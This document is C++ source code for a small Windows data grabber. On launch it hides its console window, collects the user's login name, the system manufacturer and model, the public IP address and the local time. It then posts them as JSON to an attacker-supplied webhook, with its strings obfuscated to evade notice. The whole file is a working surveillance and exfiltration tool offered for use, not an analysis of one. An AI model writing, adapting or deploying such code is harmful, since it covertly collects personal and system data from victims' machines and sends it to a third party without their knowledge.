/*
	partial credit to orlando for providing some function in this code
	https://github.com/dehoisted
*/

#define _CRT_SECURE_NO_WARNINGS


#include <Windows.h>
#include <iostream>
#include <json/json.h>
#include <WinInet.h>
#include <cpr/cpr.h>
#include <lmcons.h>
#include <time.h>
#include "obfuscator.hh"


using namespace ob;

#define WEBHOOK STR("webhook here")
#define IPLINK STR("https://myexternalip.com/raw")

const char* USERNAME = STR("Username");
const char* IP = STR("IP Address");
const char* LOCALTIME = STR("Local Time");
const char* SYSMANU = STR("System Manufacturer");
const char* SYSNAME = STR("System Name");

bool isNetPresent()
{
	if (InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0))
	{
		return true;
	}
	return false;
}

void sendInfo(std::string content)
{
	cpr::Response r = cpr::Post(cpr::Url{ WEBHOOK }, cpr::Payload{ { "content", content } });
}



std::string getSysManu()
{
	std::string sysManufacturer;
	char buf[1000];
	DWORD sz = 1000;
	int ret;
	ret = RegGetValueA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "SystemManufacturer", RRF_RT_ANY, NULL, &buf[0], &sz);
	sysManufacturer = buf;
	if (ret == ERROR_SUCCESS)
	{
		return sysManufacturer;
	}
	return std::string();
}

std::string getSysName()
{
	std::string sysName;
	char buf[1000];
	DWORD sz = 1000;
	int ret;
	ret = RegGetValueA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "SystemProductName", RRF_RT_ANY, NULL, &buf[0], &sz);
	sysName = buf;
	if (ret == ERROR_SUCCESS)
	{
		return sysName;
	}
	return std::string();
}

std::string getIP()
{
	return cpr::Get(cpr::Url{ IPLINK }).text;
}

std::string getLocalTime()
{
	std::time_t time = std::time(0);
	tm* local = std::localtime(&time);
	return asctime(local);
}

std::string jsonPCInfo()
{
	Json::Value root;
	Json::StreamWriterBuilder builder;
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(username, &username_len);
	root[USERNAME] = username;
	root[SYSNAME] = getSysName();
	root[SYSMANU] = getSysManu();
	root[IP] = getIP();
	root[LOCALTIME] = getLocalTime();
	return Json::writeString(builder, root);
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (!isNetPresent())
		exit(-1);
	sendInfo(jsonPCInfo());
	
	return 0;

}